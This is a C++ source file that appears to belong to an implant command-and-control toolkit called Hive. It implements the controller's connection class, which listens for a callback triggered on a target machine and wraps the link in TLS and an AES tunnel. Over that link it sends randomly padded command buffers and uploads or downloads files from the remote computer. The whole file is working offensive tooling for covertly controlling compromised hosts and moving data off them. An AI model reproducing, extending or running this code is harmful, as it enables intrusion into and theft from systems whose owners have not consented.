#include <iostream>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include "LibraryModuleBase.h"
#include "ProcessCmdResponse.h"
#include "Primitive.h"
#include "ilm-client.h"
#include "Connection.h"
#include "Utilities.h"
#include "hive.h"

extern "C" {
#include "crypto.h"
#include "proj_strings.h"
#include "colors.h"
#include "debug.h"
}

//*****************************************************************************************

using namespace InterfaceLibrary;
using namespace InterfaceLibrary::Primitive;

//*****************************************************************************************

//crypt_context	*target_io;			// Command and control context for target communication
extern HiveILM	*myILMInstance;

//*****************************************************************************************
Connection::Connection()
{
	DL(6);
	ioc = NULL;
	state = NOCONNECTION;
	return;
}

//*****************************************************************************************
Connection::~Connection()
{
	DL(6);
	crypt_close_notify(ioc);
	close( acceptfd );
	close( listenfd );
	state = NOCONNECTION;
	return;
}

//*****************************************************************************************
int Connection::Close( void )
{
	DL(6);
	return close( listenfd );
}

//*****************************************************************************************
int Connection::Listen( uint16_t lport )
{
	int		n = 1;

	DL(6);
	local.sin_family = AF_INET;
	local.sin_addr.s_addr = htonl( INADDR_ANY );
	local.sin_port = htons( lport );

	// this tries to address the case where a raw-tcp trigger is sent to a close port.
	// the CT UI will return an error (libhclient code) that says the connect failed.
	// however, the listening socket created below, first, will still be holding the
	// the listening callback port open.  therefore, without exiting the CT UI,
	// if the user attempt to trigger again, they will get a different error....
	// bind(): Address already in use.  By freeing the socket descriptor prior to
	// calling bind on it, the hope is that this specific sequence of events is 
	// permitted without any adverse side-effects
//	close( listenfd );

	//if ( ( local.sin_port < 1 ) || ( local.sin_port > 65535 ) ) //Old compiler complained since sin_port can never be greater than 65535...
	if  ( local.sin_port < 1 ) 
	{
		state = CONNERROR;
		return ERROR;
	}

	if ( ( listenfd = socket( AF_INET, SOCK_STREAM, 0 ) ) == ERROR )
	{
		perror( " * socket()" );
		state = CONNERROR;
		return ERROR;
	}

	if ( setsockopt( listenfd, SOL_SOCKET, SO_REUSEADDR, (void *)&n, sizeof( n ) ) < 0 )
	{
		state = CONNERROR;
		close( listenfd );
		perror( " * setsockopt()" );
		return ERROR;
	}

	if ( bind( listenfd, ( struct sockaddr *)&local, sizeof( local ) ) == ERROR )
	{
		close( listenfd );
		state = CONNERROR;
		perror( " * bind()" );
		return ERROR;
	}

	if ( listen( listenfd, 1 ) == ERROR )
	{
		state = CONNERROR;
		perror( " * listen()" );
		close( listenfd );
		return ERROR;
	}

	state = LISTENING;
    //fprintf( stdout, "\n %sListening for a connection on port %d ...%s\n", BLUE, ntohs( info->local.sin_port ), RESET );
//	printf( "\n %s%s %d ...%s\n", BLUE, listeningString, ntohs( local.sin_port ), RESET );
//	printf( "\n Listening for a connection on port %d ...", ntohs( local.sin_port ) );
	cout << " Listening for connection on port " << ntohs( local.sin_port ) << " ...";
	fflush( NULL ); fflush( NULL );
	
	return SUCCESS;

}

//*****************************************************************************************
int Connection::Accept( std::string& ip )
{
	socklen_t	len;

	DL(6);
	len = sizeof( local );

	if ( ( acceptfd = accept( listenfd, ( struct sockaddr * )&remote, &len ) ) == ERROR )
	{
		state = CONNERROR;
		cout << " failed!" << endl;
		perror( " * accept()");
		close( listenfd );
		return ERROR;
	}

	close( listenfd );
	DL(6);
	len = sizeof( local );

	if ( getsockname( acceptfd, ( struct sockaddr *)&local, &len ) == ERROR )
	{
		cout << " failed!" << endl;
		perror( " * getsockname()");
		return ERROR;
	}

    //fprintf( stdout, " %s... connection established%s\n", BLUE, RESET );
//	printf( " %s%s%s\n", BLUE, connectionEstString, RESET );
	cout << " ... connection established!" << endl;

   //fprintf(stdout, "\n %sSession configuration parameters:%s\n", BLUE, RESET);
//	printf( "\n %s%s:%s\n", BLUE, sessionConfigParamString, RESET );
	cout << endl << " Connection details:" << endl;


   //rv = asprintf(&message, "  . Remote IP address %s on port %d\n", inet_ntoa(info->remote.sin_addr), ntohs(info->remote.sin_port));
//	printf( "%s %s %s %d\n", remoteIPAddressString, inet_ntoa(remote.sin_addr), onPortString, ntohs(remote.sin_port));
	cout << "  . Remote IP address " << inet_ntoa( remote.sin_addr ) << " on port " << ntohs( remote.sin_port ) << endl;
	ip = inet_ntoa( remote.sin_addr );

   //rv = asprintf(&message, "  . Local IP address %s on port %d\n", inet_ntoa(info->local.sin_addr), ntohs(info->local.sin_port));
//	printf( "%s %s %s %d\n", localIPAddressString, inet_ntoa(local.sin_addr), onPortString, ntohs(local.sin_port));
	cout << "  . Local  IP address " << inet_ntoa( local.sin_addr ) << " on port " << ntohs( local.sin_port ) << endl;

   //printf( "\n %sEnabling encrypted communications:%s\n", BLUE, RESET );
//	printf( "\n %s%s:%s\n", BLUE, run1String, RESET );
	cout << endl << " Enabling encrypted communications:" << endl;

    // from a SSL/TLS perspective, the client acts like a SSL server
    if ((ioc = crypt_setup_server(&acceptfd)) == NULL) {
		state = CONNERROR;
        D( printf( " * ERROR: crypt_setup_server() failed\n" ); )
        //printf( " ERROR: TLS connection with TLS client failed to initialize.\n" ); 
//        printf( "%s", run2String );
		cout << " * Error: TLS connection with TLS client failed to initialize." << endl;
        return ERROR;
    }

    // start TLS handshake
    if ( crypt_handshake(ioc) != SUCCESS )
    {
		state = CONNERROR;
        //printf( " ERROR: TLS connection with TLS client failed to initialize.\n" ); 
//        printf( "%s", run2String );
		cout << " * Error: TLS connection with TLS client failed to initialize." << endl;
        return ERROR;
    }

	cout << "  . TLS handshake complete." << endl;

	if ((aes_init(ioc)) == 0) {
		cout << "  * Error: AES initialization failed." << endl;
		return ERROR;
	}
	cout << "  . AES-encrypted tunnel established." << endl << endl;
	state = CONNECTED;
	return SUCCESS;
}


//*****************************************************************************************
#include <string.h>
#include <stdio.h>


//*****************************************************************************************
int Connection::TxCommand( struct send_buf* sbuf, REPLY *rbuf, unsigned char command_code )
{
	int len = strlen( sbuf->path ) + 1;

	DL(6);
	if ( state != CONNECTED )
	{
		state = NOCONNECTION;
		goto error;
	}

	sbuf->command = command_code;

	// GenRandomBytes( buf1, buf1_len, buf2, buf2_len )
	// both buf1 and buf2 are filled with *_len rand bytes
	if ( sbuf->command != UPLOAD )
	{
		if ( len < 255 )
		{
			// except for UPLOAD, the size and padding fields are unused.
			// size & padding are next to each other in the structure and each is 4 bytes in size
			// writing 8 bytes starting at size will fill both fields
			Utilities::GenRandomBytes( &sbuf->path[len], (255 - len), (char*)&sbuf->size, 8 );
		}
		else
		{
			// path is full, so no random bytes needed
			Utilities::GenRandomBytes( (char*)&sbuf->size, 8, NULL, 0 );
		}
	}
	// UPLOAD 
	else
	{
		if ( len < 255 )
		{
			// for UPLOAD, the size field is used but padding field is not.
			// only need to fill padding with random bytes
			Utilities::GenRandomBytes( &sbuf->path[len], (255 - len), (char*)&sbuf->padding, 4 );
		}
		else
		{
			// path is full, so no random bytes needed
			Utilities::GenRandomBytes( (char*)&sbuf->padding, 4, NULL, 0 );
		}
	}

// crypt_write() returns the detailed error code, but we return ERROR for all errors
	if ( crypt_write(ioc, (unsigned char *)sbuf, 264) < 0 )
	{
		//fprintf(stderr, "\tSendCommand(): failure sending request to the remote computer\n");
//		printf( " * %s", sendCommand1String );
		state = NOCONNECTION;
		goto error;
	}

// crypt_read() returns the detailed error code, but we return ERROR for all errors
	if (crypt_read(ioc, (unsigned char *)rbuf, sizeof(REPLY)) < 0 )
	{
		//fprintf(stderr, "\tSendCommand(): failure receiving response from the remote computer\n");
//		printf( " * %s", sendCommand2String );
		state = NOCONNECTION;
		goto error;
	}

	return SUCCESS;

error:
	rbuf->reply = htonl( ERROR );
	Utilities::SetCTStateDisconnected();
	myILMInstance->RemoveCustomCmds();
	return state;
}


//*****************************************************************************************
int Connection::RecvFile( int fd, int size )
{
    int				rbytes;
    unsigned char	buffer[4096];
    REPLY			rbuf;

	DL(6);
	if ( state != CONNECTED )
	{
		return -1;
	}

    while ( size > 0 )
    {
        memset( buffer, 0, 4096 );
        if ((rbytes = crypt_read(ioc, buffer, 4096) ) <= 0 ) {
            //fprintf(stderr, "\tRecvFile(): failure receiving data from the remote computer\n");
            printf( " * %s", recvFile1String );
            return ERROR;
        }

        if ( size < rbytes ) {
            if ( write( fd, buffer, size ) == ERROR )
            {
                perror( " * write()" );
                return ERROR;
            }
        } else {
            if ( write( fd, buffer, rbytes ) == ERROR ) {
                perror( " * write()" );
                return ERROR;
            }
        }
        size -= rbytes;
    }

    if ((rbytes = crypt_read(ioc, (unsigned char *)&rbuf, sizeof(REPLY))) <= 0 ) {
        //fprintf(stderr, "\tRecvFile(): failure receiving acknowledge from the remote computer\n");
        printf( " * %s", recvFile2String );
        return ERROR;
    }

    return (rbuf.reply);

}

//*****************************************************************************************
int Connection::SendFile( int fd, int size )
{
    int				rbytes;
    unsigned char	buffer[4096];
    REPLY			rbuf;

	DL(6);
	if ( state != CONNECTED ) {
		return -1;
	}

    while (size > 0) {
        memset(buffer, 0, 4096);
        if ((rbytes = read(fd, buffer, 4096)) == ERROR ) {
            perror( " * read()" );
            return ERROR;
        }

        if (crypt_write(ioc, buffer, rbytes) <= 0 ) {
            //fprintf(stderr, "\tSendFile(): failure sending data to the remote computer\n");
            printf( " * %s", sendFile1String );
            return ERROR;
        }
        size -= rbytes;
    }

    if ((rbytes = crypt_read(ioc, (unsigned char *)&rbuf, sizeof(REPLY))) <= 0 ) {
        //fprintf(stderr, "\tSendFile(): failure receiving acknowledgement from the remote computer\n");
        printf( " * %s", sendFile2String );
        return ERROR;
    }

    // returns zero on success
    return (rbuf.reply);
}

